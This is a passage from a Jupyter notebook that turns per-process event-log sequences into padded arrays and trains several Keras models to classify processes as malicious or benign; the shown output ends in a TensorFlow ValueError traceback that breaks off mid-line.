   ],
   "source": [
    "# observe longest EventID sequences\n",
    "newdf.groupby('ProcessId').size().sort_values()[-15:]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Note!  \n",
    "Need to cut sequences from beginning (aka `pre`), leaving latest EventID entries as containing actual Process activity, whereas first EventID very often are DLL loads.  \n",
    "\n",
    "Mentioned logic using `pad_sequences`:\n",
    "```\n",
    ">>> sequence = [[1], [2, 3], [4, 5, 6]]\n",
    ">>> pad_sequences(sequence, maxlen=2, padding='pre', truncating='pre', value=0)\n",
    "\n",
    "array([[0, 1],\n",
    "       [2, 3],\n",
    "       [5, 6]])\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 212,
   "metadata": {},
   "outputs": [],
   "source": [
    "MAX_TIMESTEPS = 128\n",
    "# number of features (except PID itself)\n",
    "N = len(newdf.columns) - 1\n",
    "\n",
    "def groupby_transform(dataframe, column):\n",
    "    global MAX_TIMESTEPS, N\n",
    "    total = len(dataframe.groupby(column))\n",
    "    start = datetime.now()\n",
    "    print(f\"Started at: {start}\")\n",
    "\n",
    "    print(f\"Total categories of '{column}': '{total}'\")\n",
    "    print(f\"Unique values: {dataframe[column].nunique()}\")\n",
    "\n",
    "    # Initialize Numpy Arrays with correct shape\n",
    "    X = np.empty(shape=(0, MAX_TIMESTEPS, N)).astype(np.int16)\n",
    "    y = np.empty(shape=(0,1)).astype(np.int16)\n",
    "\n",
    "    # get encode object for string columns\n",
    "    binary_le = LabelEncoder().fit(['OTHER'] + list(dataframe['binary'].unique()))\n",
    "    path_le = LabelEncoder().fit(['OTHER'] + list(dataframe['path'].unique()))\n",
    "    \n",
    "    # load malicious/valid process lists\n",
    "    with open('pid_valid.lst') as f:\n",
    "        valid_lst = [x.strip() for x in f.readlines()]\n",
    "    with open('pid_malicious.lst') as f:\n",
    "        mal_lst = [x.strip() for x in f.readlines()]\n",
    "    \n",
    "    try:\n",
    "        for i, (value, df) in enumerate(dataframe.groupby(column)):\n",
    "            if not i % 100:\n",
    "                ch1 = datetime.now()\n",
    "                if i != 0:\n",
    "                    print(f\" Last 1000 samples completed in {ch1 - ch2}; {i}\")\n",
    "                ch2 = datetime.now()\n",
    "            \n",
    "            # skip processes with less than 3 events \n",
    "            # - too little to identify malicious activity\n",
    "            if len(df) < 4:\n",
    "                continue\n",
    "            \n",
    "            if value in valid_lst:\n",
    "                temp_y = np.array([0]).reshape(1,1)\n",
    "            elif value in mal_lst:\n",
    "                temp_y = np.array([1]).reshape(1,1)\n",
    "            else:\n",
    "                print(f'Unclassified ProcessID: {value}')\n",
    "                raise Exception\n",
    "\n",
    "            # 3D staff\n",
    "            temp_X = np.hstack((\n",
    "                df[['EventID', 'unc_url', 'b64', 'network']].to_numpy(),\n",
    "                binary_le.transform(list(df['binary'])).reshape(-1,1),\n",
    "                path_le.transform(list(df['path'])).reshape(-1,1)\n",
    "            ))\n",
    "\n",
    "            # PADDING\n",
    "            temp_X = pad_sequences(temp_X.T, maxlen=MAX_TIMESTEPS).T\n",
    "            \n",
    "            # adding this example to actual set\n",
    "            X = np.concatenate((X, temp_X.reshape(1, MAX_TIMESTEPS, N)))\n",
    "            y = np.concatenate((y, temp_y))\n",
    "        \n",
    "        end = datetime.now()\n",
    "        print(f\"Ended at: {end}\")\n",
    "        print(f\"Script completion time: {end - start}\")\n",
    "        return X, y\n",
    "\n",
    "    except KeyboardInterrupt:\n",
    "        end = datetime.now()\n",
    "        print(f\"Ended at:\\niteration:{i}\\ntime:{end}\")\n",
    "        print(f\"Script completion time: {end - start}\")\n",
    "        return X, y\n",
    "\n",
    "    except Exception as ex:\n",
    "        print(ex)\n",
    "        np.save(f'X{i}.npy', X)\n",
    "        np.save(f'y{i}.npy', y)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 213,
   "metadata": {
    "tags": [
     "outputPrepend",
     "outputPrepend"
    ]
   },
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "Started at: 2020-06-07 21:55:26.474651\nTotal categories of 'ProcessId': '93'\nUnique values: 93\nEnded at: 2020-06-07 21:55:26.657585\nScript completion time: 0:00:00.182934\n"
    }
   ],
   "source": [
    "X, y = groupby_transform(newdf, 'ProcessId')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 214,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "Malicious processes: 19\nValid processes: 61\nMalicious percentage: 23.75 %\n"
    }
   ],
   "source": [
    "u, c = np.unique(y, return_counts=True)\n",
    "pos, neg = c\n",
    "pos, neg\n",
    "print(f\"Malicious processes: {neg}\\nValid processes: {pos}\")\n",
    "print(f\"Malicious percentage: {round(neg*100/(pos+neg),4)} %\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 215,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "(80, 128, 6)"
     },
     "metadata": {},
     "execution_count": 215
    }
   ],
   "source": [
    "X.shape"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## `tf.data.Dataset` building"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 216,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tensorflow as tf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 219,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "(64, 128, 6)\n(64, 1)\n(16, 128, 6)\n(16, 1)\n"
    }
   ],
   "source": [
    "train_X, val_X, train_y, val_y = train_test_split(X, y, test_size=0.2)\n",
    "print(train_X.shape)\n",
    "print(train_y.shape)\n",
    "print(val_X.shape)\n",
    "print(val_y.shape)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 221,
   "metadata": {},
   "outputs": [],
   "source": [
    "BATCH_SIZE = 8\n",
    "SHUFFLE_BUFFER = 100\n",
    "\n",
    "train_Xds = tf.data.Dataset.from_tensor_slices((train_X, train_y)).\\\n",
    "                    shuffle(SHUFFLE_BUFFER).batch(BATCH_SIZE).prefetch(1)\n",
    "val_Xds = tf.data.Dataset.from_tensor_slices((val_X, val_y)).\\\n",
    "                    shuffle(SHUFFLE_BUFFER).batch(BATCH_SIZE).prefetch(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Training"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 223,
   "metadata": {},
   "outputs": [],
   "source": [
    "from models import  model_simplest, model_dd, model_deep, model_deeper, model_bidir, model_conv_rnn, model_conv_birnn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 224,
   "metadata": {},
   "outputs": [],
   "source": [
    "models = { 'simplest': model_simplest(MAX_TIMESTEPS, N), \n",
    "  'dropout_dense': model_dd(MAX_TIMESTEPS, N),\n",
    "  'deep': model_deep(MAX_TIMESTEPS, N),\n",
    "  'deeper': model_deeper(MAX_TIMESTEPS, N),\n",
    "  'bidirectional': model_bidir(MAX_TIMESTEPS, N),\n",
    "  'conv1d': model_conv_rnn(MAX_TIMESTEPS, N),\n",
    "  'conv1d_bi': model_conv_birnn(MAX_TIMESTEPS, N)}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 226,
   "metadata": {},
   "outputs": [],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "import tensorflow.keras as keras\n",
    "\n",
    "colors = plt.rcParams['axes.prop_cycle'].by_key()['color']\n",
    "\n",
    "def plot_loss(epochs, history, label, n, val=False):\n",
    "    # Use a log scale to show the wide range of values.\n",
    "    plt.semilogy(epochs,  history['loss'],\n",
    "               color=colors[n], label='Train '+label)\n",
    "    if val:\n",
    "      plt.semilogy(epochs,  history['val_loss'],\n",
    "            color=colors[n], label='Val '+label,\n",
    "            linestyle=\"--\")\n",
    "    plt.xlabel('Epoch')\n",
    "    plt.ylabel('Loss')\n",
    "  \n",
    "    plt.legend()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 231,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "\n0th model: simplest!\n2/2 [==============================] - 1s 375ms/step - loss: 0.8071 - tp: 1.0000 - fp: 0.0000e+00 - tn: 9.0000 - fn: 6.0000 - precision: 1.0000 - recall: 0.1429 - auc: 0.6587 - accuracy: 0.0000e+00\nloss :  0.8070625364780426\ntp :  1.0\nfp :  0.0\ntn :  9.0\nfn :  6.0\nprecision :  1.0\nrecall :  0.14285715\nauc :  0.6587302\naccuracy :  0.0\n\n\n1th model: dropout_dense!\n2/2 [==============================] - 1s 370ms/step - loss: 0.8357 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 9.0000 - fn: 7.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.5714 - accuracy: 0.0000e+00\nloss :  0.8357423841953278\ntp :  0.0\nfp :  0.0\ntn :  9.0\nfn :  7.0\nprecision :  0.0\nrecall :  0.0\nauc :  0.57142854\naccuracy :  0.0\n\n\n2th model: deep!\n2/2 [==============================] - 1s 390ms/step - loss: 0.8906 - tp: 0.0000e+00 - fp: 0.0000e+00 - tn: 9.0000 - fn: 7.0000 - precision: 0.0000e+00 - recall: 0.0000e+00 - auc: 0.5635 - accuracy: 0.0000e+00\nloss :  0.8905999064445496\ntp :  0.0\nfp :  0.0\ntn :  9.0\nfn :  7.0\nprecision :  0.0\nrecall :  0.0\nauc :  0.56349206\naccuracy :  0.0\n\n\n3th model: deeper!\n2/2 [==============================] - 1s 562ms/step - loss: 0.6947 - tp: 1.0000 - fp: 0.0000e+00 - tn: 9.0000 - fn: 6.0000 - precision: 1.0000 - recall: 0.1429 - auc: 0.8095 - accuracy: 0.0000e+00\nloss :  0.6947189718484879\ntp :  1.0\nfp :  0.0\ntn :  9.0\nfn :  6.0\nprecision :  1.0\nrecall :  0.14285715\nauc :  0.8095238\naccuracy :  0.0\n\n\n4th model: bidirectional!\n"
    },
    {
     "output_type": "error",
     "ename": "ValueError",
     "evalue": "x has to be a floating point tensor since it's going to be scaled. Got a <dtype: 'int32'> tensor instead.",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mValueError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-231-20ea2c90de18>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m     18\u001b[0m   \u001b[0mmodel\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcompile\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0moptimizer\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mOPT\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mloss\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;34m'binary_crossentropy'\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mmetrics\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mMETRICS\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     19\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 20\u001b[1;33m   \u001b[0mh\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mmodel\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mtrain_Xds\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mepochs\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;36m100\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mverbose\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     21\u001b[0m   \u001b[0mplt\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mfigure\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mfigsize\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m8\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;36m4\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     22\u001b[0m   \u001b[0mplot_loss\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mh\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mepoch\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mh\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mhistory\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34mf\"\\n{i}th model, {name}\"\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mi\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training.py\u001b[0m in \u001b[0;36mfit\u001b[1;34m(self, x, y, batch_size, epochs, verbose, callbacks, validation_split, validation_data, shuffle, class_weight, sample_weight, initial_epoch, steps_per_epoch, validation_steps, validation_freq, max_queue_size, workers, use_multiprocessing, **kwargs)\u001b[0m\n\u001b[0;32m    817\u001b[0m         \u001b[0mmax_queue_size\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mmax_queue_size\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    818\u001b[0m         \u001b[0mworkers\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mworkers\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 819\u001b[1;33m         use_multiprocessing=use_multiprocessing)\n\u001b[0m\u001b[0;32m    820\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    821\u001b[0m   def evaluate(self,\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training_v2.py\u001b[0m in \u001b[0;36mfit\u001b[1;34m(self, model, x, y, batch_size, epochs, verbose, callbacks, validation_split, validation_data, shuffle, class_weight, sample_weight, initial_epoch, steps_per_epoch, validation_steps, validation_freq, max_queue_size, workers, use_multiprocessing, **kwargs)\u001b[0m\n\u001b[0;32m    233\u001b[0m           \u001b[0mmax_queue_size\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mmax_queue_size\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    234\u001b[0m           \u001b[0mworkers\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mworkers\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 235\u001b[1;33m           use_multiprocessing=use_multiprocessing)\n\u001b[0m\u001b[0;32m    236\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    237\u001b[0m       \u001b[0mtotal_samples\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0m_get_total_number_of_samples\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mtraining_data_adapter\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training_v2.py\u001b[0m in \u001b[0;36m_process_training_inputs\u001b[1;34m(model, x, y, batch_size, epochs, sample_weights, class_weights, steps_per_epoch, validation_split, validation_data, validation_steps, shuffle, distribution_strategy, max_queue_size, workers, use_multiprocessing)\u001b[0m\n\u001b[0;32m    591\u001b[0m         \u001b[0mmax_queue_size\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mmax_queue_size\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    592\u001b[0m         \u001b[0mworkers\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mworkers\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 593\u001b[1;33m         use_multiprocessing=use_multiprocessing)\n\u001b[0m\u001b[0;32m    594\u001b[0m     \u001b[0mval_adapter\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    595\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mvalidation_data\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training_v2.py\u001b[0m in \u001b[0;36m_process_inputs\u001b[1;34m(model, mode, x, y, batch_size, epochs, sample_weights, class_weights, shuffle, steps, distribution_strategy, max_queue_size, workers, use_multiprocessing)\u001b[0m\n\u001b[0;32m    704\u001b[0m       \u001b[0mmax_queue_size\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mmax_queue_size\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    705\u001b[0m       \u001b[0mworkers\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mworkers\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 706\u001b[1;33m       use_multiprocessing=use_multiprocessing)\n\u001b[0m\u001b[0;32m    707\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    708\u001b[0m   \u001b[1;32mreturn\u001b[0m \u001b[0madapter\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\data_adapter.py\u001b[0m in \u001b[0;36m__init__\u001b[1;34m(self, x, y, sample_weights, standardize_function, **kwargs)\u001b[0m\n\u001b[0;32m    700\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    701\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mstandardize_function\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 702\u001b[1;33m       \u001b[0mx\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mstandardize_function\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mx\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    703\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    704\u001b[0m     \u001b[1;31m# Note that the dataset instance is immutable, its fine to reusing the user\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training_v2.py\u001b[0m in \u001b[0;36mstandardize_function\u001b[1;34m(dataset)\u001b[0m\n\u001b[0;32m    658\u001b[0m         \u001b[0mmodel\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msample_weight_mode\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mgetattr\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mmodel\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m'sample_weight_mode'\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    659\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 660\u001b[1;33m       \u001b[0mstandardize\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdataset\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mextract_tensors_from_dataset\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;32mFalse\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    661\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    662\u001b[0m       \u001b[1;31m# Then we map using only the tensor standardization portion.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training.py\u001b[0m in \u001b[0;36m_standardize_user_data\u001b[1;34m(self, x, y, sample_weight, class_weight, batch_size, check_steps, steps_name, steps, validation_split, shuffle, extract_tensors_from_dataset)\u001b[0m\n\u001b[0;32m   2344\u001b[0m     \u001b[1;31m# First, we build the model on the fly if necessary.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2345\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 2346\u001b[1;33m       \u001b[0mall_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0my_input\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mdict_inputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_build_model_with_inputs\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mx\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0my\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   2347\u001b[0m       \u001b[0mis_build_called\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;32mTrue\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2348\u001b[0m     \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training.py\u001b[0m in \u001b[0;36m_build_model_with_inputs\u001b[1;34m(self, inputs, targets)\u001b[0m\n\u001b[0;32m   2570\u001b[0m     \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2571\u001b[0m       \u001b[0mcast_inputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0minputs\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 2572\u001b[1;33m     \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_set_inputs\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mcast_inputs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   2573\u001b[0m     \u001b[1;32mreturn\u001b[0m \u001b[0mprocessed_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtargets\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mis_dict_inputs\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2574\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\training.py\u001b[0m in \u001b[0;36m_set_inputs\u001b[1;34m(self, inputs, outputs, training)\u001b[0m\n\u001b[0;32m   2657\u001b[0m           \u001b[0mkwargs\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'training'\u001b[0m\u001b[1;33m]\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2658\u001b[0m       \u001b[1;32mtry\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 2659\u001b[1;33m         \u001b[0moutputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   2660\u001b[0m       \u001b[1;32mexcept\u001b[0m \u001b[0mNotImplementedError\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2661\u001b[0m         \u001b[1;31m# This Model or a submodel is dynamic and hasn't overridden\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\base_layer.py\u001b[0m in \u001b[0;36m__call__\u001b[1;34m(self, inputs, *args, **kwargs)\u001b[0m\n\u001b[0;32m    771\u001b[0m                     not base_layer_utils.is_in_eager_or_tf_function()):\n\u001b[0;32m    772\u001b[0m                   \u001b[1;32mwith\u001b[0m \u001b[0mauto_control_deps\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mAutomaticControlDependencies\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0macd\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 773\u001b[1;33m                     \u001b[0moutputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mcall_fn\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mcast_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m*\u001b[0m\u001b[0margs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    774\u001b[0m                     \u001b[1;31m# Wrap Tensors in `outputs` in `tf.identity` to avoid\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    775\u001b[0m                     \u001b[1;31m# circular dependencies.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\sequential.py\u001b[0m in \u001b[0;36mcall\u001b[1;34m(self, inputs, training, mask)\u001b[0m\n\u001b[0;32m    279\u001b[0m         \u001b[0mkwargs\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'training'\u001b[0m\u001b[1;33m]\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    280\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 281\u001b[1;33m       \u001b[0moutputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mlayer\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    282\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    283\u001b[0m       \u001b[1;31m# `outputs` will be the inputs to the next 